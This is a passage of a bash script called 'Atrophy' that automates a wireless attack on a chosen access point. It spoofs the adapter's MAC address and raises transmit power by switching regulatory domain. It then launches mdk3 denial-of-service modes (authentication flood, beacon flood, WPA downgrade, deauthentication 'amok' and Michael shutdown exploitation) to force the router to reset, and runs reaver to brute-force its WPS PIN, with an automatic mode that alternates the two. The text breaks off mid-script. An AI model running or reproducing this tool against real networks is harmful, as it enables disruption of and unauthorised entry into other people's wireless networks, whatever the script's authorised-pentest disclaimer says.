#!/bin/bash
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# --------------------------------------------------------------------------------------------------------------------#

# Disclaimer:   This script is intended for use only for private study or during an authorised pentest. The author bears no responsibility for malicious or illegal use.
#               Skiddies should look elsewhere.


#
# !!!!!!!Thanks to Vulpi author of pwnstar9.0 who's scripts taught us so much!!!!!!!
#               Any help with our mangeled coding is encouraged.
#                              Musket Teams
##############################################
# ANSI code routines from Vulpi author of
#              PwnStar9.0 
txtrst="\e[0m"      # Text reset 
warn="\e[1;31m"     # warning		   red         
info="\e[1;34m"     # info                 blue             
q="\e[1;32m"		# questions        green
inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # typed keyboard entries
##############################################
echo " "
echo -e "$info      ######################################################################"
echo "      #               Atrophy: A Mdk3-Airodump-ng-Reaver Tool              #"
echo "      # MDK3 Multiple Vector DDOS Setup to Reset Wireless Routers Remotely #"
echo "      #              A Musket Team - Soxrox2212 Collaboration              #"
echo -e "      ######################################################################$txtrst"

echo -e "$info                                                                        "      
echo -e "$warn  <<< ALL EXISTING MONITOR INTERFACES $yel(i.e. mon0 mon1 etc.)$warn WILL BE CLEARED >>>"
echo -e "$q               <<<< ??Do you wish to continue....?? >>>>$txtrst"

while true

do
echo -e "$inp       Please confirm by pressing $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

  esac
done
echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear
killall -q reaver &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep .2
killall -q aireplay-ng &> /dev/null
sleep .2
killall -q mdk3 &> /dev/null
sleep .2
killall -q Eterm &> /dev/null
airmon-ng stop mon5
clear
airmon-ng stop mon4
clear
airmon-ng stop mon3
clear
airmon-ng stop mon2
clear
airmon-ng stop mon1
clear
airmon-ng stop mon0

####################################
ADVANCEDTEST=ZZZ
until  [ $ADVANCEDTEST == y ] || [ $ADVANCEDTEST == Y ]; do  

clear
echo ""
echo -e "$q  Do you wish to use standard or advanced setting?"
echo -e "$info     These advanced settings include.$txtrst"
echo ""
echo "                    1. Setting Specific Mac Address to your wifi device."
echo "                    2. Add -r x:y command to reaver." #(ADVANCED)" 
echo ""
echo -e "$inp  Enter $yel(s/S)$inp for standard or $yel(a/A)$inp for advanced.$txtrst" #(ADVANCED)  
read ADVANCED


	while true
	do
	echo ""
echo -e "$inp  You entered $yel$ADVANCED$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read ADVANCEDTEST

	case $ADVANCEDTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


####################################


DEVTEST=ZZZ
until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  What wireless device will you use to perform the attack$yel(i.e. wlan0,ath0 etc)$q?"
echo -e "$info    A listing of devices is shown above.$txtrst" #(DEV)
read DEV

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$DEV$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done


clear
	while true
	do
	echo ""
echo -e "$q  Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info     This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info       may work with other devices."
echo -e "$inp         Type $yel(y/Y)$inp for yes or $yel(n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done


	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then
		ifconfig $DEV down
		sleep 1
		iw reg set BO
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30
		iwconfig $DEV rate 1M
        	sleep 2
 
			fi
##############========ADVANCED===============
if [ $ADVANCED == a ] || [ $ADVANCED == A ]; then

echo -e "$q\n  What mac address would you like to assign to $DEV?" #(DEVMAC)
echo -e  "$info\n     Enter in this format ONLY(i.e. 00:11:22:33:44:55)$txtrst"
read DEVMAC
sleep 2
#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#DEVMAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi


sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your mac address is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac address entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter mac address and try again.$txtrst" #(DEVMAC)
	read DEVMAC

        MACALNUM=`echo "$DEVMAC" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#DEVMAC} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$DEVMAC" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
		  
#######Mac Error Handling Ends Whew!!#############
##################################################

echo -e "$info  Assigning $yel$DEVMAC$info to your wifi device.$txtrst"
        sleep 2
sleep 2
	ifconfig $DEV down
	sleep 2
	macchanger -m $DEVMAC $DEV
	sleep 2
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	sleep 2
	ifconfig $DEV hw ether $VARMAC
	sleep 2
	ifconfig $DEV up
        sleep 2
	airmon-ng start $DEV
	sleep 2
        clear
		fi

##############======End MAC Advanced=================

if [ $ADVANCED == s ] || [ $ADVANCED == S ]; then

	echo -e "$info  Assigning a random mac address to device.$txtrst"
        sleep 2
	ifconfig $DEV down
	sleep 2
	macchanger -r $DEV
	sleep 2
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	sleep 2
	ifconfig $DEV hw ether $VARMAC
	sleep 2
	ifconfig $DEV up
	airmon-ng start $DEV
	sleep 2
        clear
  
		fi
MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do  
echo -e "$txtrst "
clear
iwconfig
echo ""
echo -e "$q  What wireless monitor interface $yel(i.e. mon0, mon1)$q will"
echo -e "     be used by mdk3,reaver and airodump-ng?"
echo -e "$info      A listing of devices is shown above.$txtrst" #(MON)
read MON

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MON$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

sleep .2
echo -e "$info  Assigning $yel$DEV$info mac address to $yel$MON$info.$txtrst"
ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep .1
ifconfig $MON up
sleep 1
clear
echo ""
################-rXY starts############################
RCHOICE=n
if [ $ADVANCED == a ] || [ $ADVANCED == A ]; then

	clear
	while true
	do
	echo ""
echo -e "$q  Do you wish to run reaver with the -r, --recurring-delay=<x:y> command"
echo "     i.e. Sleep for y seconds every x pin attempts"
echo "" 
echo -e "$inp    Type $yel(y/Y)$inp for yes and $yel(n/N)$inp for no:(RCHOICE).$txtrst"
	read RCHOICE   
	case $RCHOICE in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done


	if [ $RCHOICE == Y ]; then

		RCHOICE=y 

		fi

	if [ $RCHOICE == N ]; then

		RCHOICE=n

		fi

	if [ $RCHOICE == y ]; then  # if 2

	RXTEST=ZZZ
		until  [ $RXTEST == y ] || [ $RXTEST == Y ]; do  

		echo ""
		echo -e "$q  How many pin attempts x in -r x:y before delay y in seconds?(RX)"
		echo ""
		echo -e "$inp     Enter number of pin attempts x.$txtrst" #(RX)
		read RX

		while true
		do
		echo ""

		echo -e "$inp  You entered $yel$RX$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$tstrst"

		read RXTEST
		case $RXTEST in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

		done

			done


		RYTEST=ZZZ
		until  [ $RYTEST == y ] || [ $RYTEST == Y ]; do  

		clear
		echo ""
		echo -e "$q  How many seconds will Reaver sleep between pin attempts x, in -r $RX:y?"
		echo ""
		echo -e "$inp     Enter delay in seconds y.(RY)$txtrst"
		read RY

		while true
		do
		echo ""
		echo -e "$inp  You entered $yel$RY$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"

		read RYTEST
		case $RYTEST in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

		done

			done

			fi

				fi


#################-rXY ends#################################


echo ""
echo -e "$info  <<<< You will need the following information to setup the DOS attack. >>>>"
echo ""
echo -e "$txtrst       1. Channel of target AP."
echo "       2. Mac address of target AP."
echo ""

####################################

	while true
	do
        echo ""
	echo -e "$info  Do you wish to run wash or airodump-ng to obtain this information?" #(WASHAIR)
	echo -e "$inp     Type $yel(w/W)$inp for wash, $yel(a/A)$inp for airodump-ng or"
	echo -e "       type $yel(c/C)$inp to skip a scan for a target AP and continue....$txtrst"

		read WASHAIR
		case $WASHAIR in
    		w|W|a|A|c|C) break ;;
    		~|~~)
    		echo Aborting -
    		exit
     		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done


if [ $WASHAIR == w ] || [ $WASHAIR == W ]; then

	until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do
	killall -q Eterm &> /dev/null
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "WASH" -e sh -c "wash -i $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel "any key" $info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the Atrophy main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q wash &> /dev/null

		clear
		while true
		do
	echo ""
        echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue.... or type $yel(w/W)$inp for wash to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|w|W) break ;;
    	~|~~)
    	exit
     	;;

  	esac
	echo -e "$warn !!!error wrong input try again!!!$txtrst"

			done

		done

	fi	

if [ $WASHAIR == a ] || [ $WASHAIR == A ]; then
		until [ $WASHAIR == c ] || [ $WASHAIR == C ]; do

	while true
	do
        echo -e "$q  Do you wish airodump-ng to scan all channels or scan a fixed channel?"
	echo -e "$inp     Type $yel(1)$inp to scan all channels or $yel(2)$inp to scan a specific channel.$txtrst" #(CHANCHO)

	read CHANCHO
	case $CHANCHO in
	1|2) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done

			if [ $CHANCHO == 1 ]; then

	killall -q Eterm &> /dev/null
	clear
        sleep .2
	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel(any key)$info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the Atrophy main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null



	clear
	while true
	do
	echo ""

	echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue... or type $yel(a/A)$inp for airodump-ng to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
	c|C|a|A) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done



				fi


			if [ $CHANCHO == 2 ]; then
	killall -q Eterm &> /dev/null
	echo -e "$warn  If Eterm window was removed - ignore warning above.$txtrst"
	sleep .2

##########
	clear
	while true
	do
	echo ""
	echo -e "$q  What is your target APs' channel?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done


	Eterm -g 80x30-1-210 --cmod "red" -T "AIRODUMP-NG" -e sh -c "airodump-ng -c $CHANNEL $MON; bash" &
	echo -e "$info  To capture a mac address from the Eterm Window type $yel(any key) $info and the"
        echo "     Eterm window will halt. Use your mouse-left click and drag across the"
        echo -e "       data required. Type $yel(Ctrl-c)$info to capture to clipboard. Now go"
        echo -e "         to the Atrophy main menu and type $yel(shift-insert)$info to insert mac address.$txtrst" #(ANYKEY)
	read ANYKEY
	killall -q airodump-ng &> /dev/null

	clear
	while true
	do
	echo ""
        echo -e "$info  If you have the mac address and channel type $yel(c/C)$inp to"
	echo -e "     continue... or type $yel(a/A)$inp for airodump-ng to try again.$txtrst"

	read WASHAIR
	case $WASHAIR in
    	c|C|a|A) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

  	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

					done

				fi
	
		done		
	fi

	
#################################

sleep .2
killall -q wash &> /dev/null
sleep .2
killall -q airodump-ng &> /dev/null
sleep 2
clear
echo ""
echo -e "$q\n  What is your target APs' mac address?" #(TARGETAP)
echo -e  "$info\n     Enter in this format ONLY(i.e. 00:11:22:33:44:55)$txtrst"
read TARGETAP
sleep 2
#### MAC Error Handling Begins ###
##################################
# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present

#Sets correct puntuation for test
MACPUNCT=":::::"

sleep .2

# Tests punctuation

PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

# Tests hex characters

MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

# Tests string length

if [ ${#TARGETAP} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi


sleep .2

# All mac variables set to ones(1)  and zeros(0)

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your mac address is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac address entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter mac address and try again.$txtrst" #(TARGETAP)
	read TARGETAP

        MACALNUM=`echo "$TARGETAP" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#TARGETAP} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$TARGETAP" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
  
#######Mac Error Handling Ends Whew!!#############
##################################################

clear
while true
do
echo ""
echo -e "$q  What is your target APs' channel?$txtrst" #(CHANNEL)

	read CHANNEL
	case $CHANNEL in
    	1|2|3|4|5|6|7|8|9|10|11|12|13|14) break ;;
    	~|~~)
    	echo Aborting -
    	exit
     	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done

sleep 2
echo $TARGETAP > blacklist

echo -e "$info  A Blacklist file is being written for Deauth/Disass"
echo "      Amoke Mode using mac address seen below."
echo -e "$txtrst "
cat blacklist
sleep 2

	clear
	while true
	do
	echo ""
echo -e $q  "Do you wish to use Beacon Flood Mode?"
echo -e $inp     "Type $yel(y/Y)$inp for yes or $yel(n/N)$inp for no.$txtrst" #(BFM)

	read BFM
	case $BFM in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done



	clear
	while true
	do
	echo ""
echo -e $q  "Do you wish use WPA downgrade mode?"
		echo -e "$inp     Type $yel(y/Y)$inp for yes or $yel(n/N)$inp for no.$txtrst" #(WPAD)

	read WPAD
	case $WPAD in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done

	clear
	while true
	do
	echo ""

echo -e "$q  Do you wish to include the -j command in the Michael Shutdown Exploitation?$txtrst"
echo -e "$info     If target AP supports WPA-TKIP, QOS is enabled and a client is present,"
echo -e "       adding the -j command will reduce time it takes to reset router."
echo ""  
echo -e "$inp Type $yel(y/Y)$inp to add command, type $yel(n/N)$inp to not add this command$txtrst" #(JTKIP)

	read JTKIP
	case $JTKIP in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done





killall -q Eterm &> /dev/null
echo -e "$warn  If Eterm window was removed - ignore warning above.$txtrst"


##################Automatic Mode###########################################

	clear
	while true
	do
	echo ""
 
echo ""
echo -e "$warn  DO NOT USE AUTOMATIC MODE UNTIL YOU DETERMINE"
echo -e "     ABILITY TO RESET ROUTER IN MANUAL MODE"
echo ""
echo -e "$q  Do you wish to use automatic mode or manual mode?"
echo -e "$info     In automatic mode you can set time to run the mdk3 deauth."
echo -e "       After time selected has passed, mdk3 will shut down and reaver"
echo -e "         will run till WPS locking is seen, then mdk3 will run again."
echo -e "                Use CTRL-C on program page to shutdown"
echo ""
echo -e "$warn  In automatic mode reaver output is written to a file named"
echo -e "     /root/reaverlogfile not to the screen."
echo -e "$inp  Type $yel(a/A)$inp for automatic mode or $yel(m/M)$inp for manual mode$txtrst" #(AUTOMAN)

	read AUTOMAN
	case $AUTOMAN in
	a|A|m|M) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done




if [ $AUTOMAN == a ] || [ $AUTOMAN == A ]; then

	until  [ $MDKLIVETEST == y ] || [ $MDKLIVETEST == Y ]; do  
echo -e "$txtrst "
clear
echo ""
echo -e "$q  How long in minutes do you want mdk3 to run before?"
echo -e "     shutting down and starting reaver."
echo -e "$info       After time selected expires, mdk3 will shut down and reaver"
echo -e "         will start and run till WPS locking is seen."
echo -e "$warn    Enter time in minutes only!$txtrst" #(MDKLIVE)
read MDKLIVE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MDKLIVE$inp min. type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
	
	read MDKLIVETEST
	case $MDKLIVETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done
clear	
echo ""
echo -e "$info  Mdk3 will run for $MDKLIVE minutes....$txtrst"
echo "  ==================================="

STARTAUTO=ZZZ #stops unary warning
let LIVE=MDKLIVE*60  #minutes to seconds
FN=1 #starts file outside loop

until [ $STARTAUTO == e ] || [ $STARTAUTO == E ]; do


	Eterm -g 80x10-1-500 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &

sleep 2

	Eterm -g 80x10+1-210 --cmod "red" -T "Authentication DoS Mode" -e sh  -c "mdk3 $MON a -a $TARGETAP -m; bash" &

sleep 2

	if [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "Beacon Flood Mode" -e sh -c "mdk3 $MON b -a $TARGETAP -h -c $CHANNEL -s 50; bash" &

		fi
sleep 2

	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10-1-350 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2
	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == n ] || [ $BFM == N ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2


	Eterm -g 80x10-1-210 --cmod "red" -T "Deauth/Disass Amok Mode" -e sh  -c "mdk3 $MON d -b blacklist -c $CHANNEL -s 250; bash" &

sleep 2

	if [ $JTKIP == y ] || [ $JTKIP == Y ]; then

# Without -j command
	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation w/ -j" -e sh  -c "mdk3 $MON m -t $TARGETAP -j; bash" &

		fi



	if [ $JTKIP == n ] || [ $JTKIP == N ]; then

	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation" -e sh  -c "mdk3 $MON m -t $TARGETAP; bash" &

		fi

#FN=1 #starts file outside loop
PAD=`printf "%05d\n" $FN`





################reaver start#######################
sleep $LIVE

	killall -q mdk3 &> /dev/null
	sleep .2
	killall -q airodump-ng &> /dev/null
	sleep .2
	killall -q Eterm &> /dev/null




	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --out-file=reaverlogfile-$PAD --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --out-file=reaverlogfile-$PAD  -r $RX:$RY --mac=$VARMAC; bash" &

		fi


		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""	


		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &


echo "made it this far"
sleep 10


let FN=FN+1

tail -f reaverlogfile-$PAD | while read LOGLINE 

do

	[[ "${LOGLINE}" == "[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking" ]] && pkill -P $$ tail


	done #tail -f reaverlogfile-$PAD | while read LOGLINE



		done

	killall -q reaver &> /dev/null
	sleep .2
	killall -q airodump-ng &> /dev/null
	sleep .2
	killall -q aireplay-ng &> /dev/null
	sleep .2
	killall -q Eterm &> /dev/null

sleep 5






      fi # loop1 (if [ $AUTOMAN == a ] || [ $AUTOMAN == A ]; than)




#until [ $STARTAUTO == e ] || [ $STARTAUTO == E ]; do




########################MANUAL######################################

   if [ $AUTOMAN == m ] || [ $AUTOMAN == M ]; then

clear
echo ""
echo -e "$inp        !!!!!STARTING AIRODUMP-NG MDK3 ETERM WINDOWS!!!!!$txtrst"
sleep 1



STARTR=ZZZ
until [ $STARTR == e ] || [ $STARTR == E ]; do

	Eterm -g 80x10-1-500 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &

sleep 2

	Eterm -g 80x10+1-210 --cmod "red" -T "Authentication DoS Mode" -e sh  -c "mdk3 $MON a -a $TARGETAP -m; bash" &

sleep 2

	if [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "Beacon Flood Mode" -e sh -c "mdk3 $MON b -a $TARGETAP -h -c $CHANNEL -s 50; bash" &

		fi
sleep 2

	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == y ] || [ $BFM == Y ]; then

	Eterm -g 80x10-1-350 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2
	if [ $WPAD == y ] || [ $WPAD == Y ] && [ $BFM == n ] || [ $BFM == N ]; then

	Eterm -g 80x10+1-70 --cmod "red" -T "WPA Downgrade Mode" -e sh  -c "mdk3 $MON g -t $TARGETAP; bash" &

		fi

sleep 2


	Eterm -g 80x10-1-210 --cmod "red" -T "Deauth/Disass Amok Mode" -e sh  -c "mdk3 $MON d -b blacklist -c $CHANNEL -s 250; bash" &

sleep 2

	if [ $JTKIP == y ] || [ $JTKIP == Y ]; then

# Without -j command
	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation w/ -j" -e sh  -c "mdk3 $MON m -t $TARGETAP -j; bash" &

		fi


	if [ $JTKIP == n ] || [ $JTKIP == N ]; then

	Eterm -g 80x10-1-70 --cmod "red" -T "Michael Shutdown Exploitation" -e sh  -c "mdk3 $MON m -t $TARGETAP; bash" &

		fi


clear
while true
do
echo ""
echo -e "$inp  Enter $yel(r/R)$inp if you think the router has reset and want to start Reaver."
echo -e "$inp     Enter $yel(e/E)$inp to skip reaver for another attempt to reset the router"
echo -e "       or continue for program shutdown.$txtrst."

	read STARTR
	case $STARTR in
	r|R|e|E) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn !!!Wrong input try again!!!$txtrst"

		done



	if [ $STARTR == r ] || [ $STARTR == R ]; then
		killall -q Eterm &> /dev/null
                sleep .2
		killall -q mdk3 &> /dev/null
                sleep .2
		killall -q airodump-ng &> /dev/null
                sleep .2

	if [ $RCHOICE == n ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 --mac=$VARMAC; bash" &

		fi

	if [ $RCHOICE == y ]; then

		Eterm -g 80x10-1-70 --cmod "red" -T "reaver -r $RX:$RY" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 -d 15 -T .5 -r $RX:$RY --mac=$VARMAC; bash" &

		fi


#		Eterm -g 80x10-1-70 --cmod "red" -T "reaver" -e sh  -c "reaver -i $MON -a -f -c $CHANNEL -b $TARGETAP -vv -x 60 --mac=$VARMAC; bash" &
		echo""
		sleep 1

		Eterm -g 80x10+1-70 --cmod "red" -T "Airodump-ng" -e sh  -c "airodump-ng -c $CHANNEL --bssid $TARGETAP $MON; bash" &
		echo ""

		Eterm -g 80x10-1-300 --cmod "red" -T "Aireplay-ng" -e sh  -c "aireplay-ng -1 120 -a $TARGETAP $MON; bash" &
		echo ""

	clear
	while true
	do
                echo -e "$info  If reaver doesnot associate to the AP and/or the target AP is not seen"
		echo -e "     in airodump-ng, target AP MAY have changed channels!!!"
                echo -e "$inp       type $yel(r/R)$inp to rescan with airodump-ng or"
                echo -e "         type $yel(c/C)$inp to skip and continue.... $txtrst"

		read RESCAN
		case $RESCAN in
		r|R|c|C) break ;;
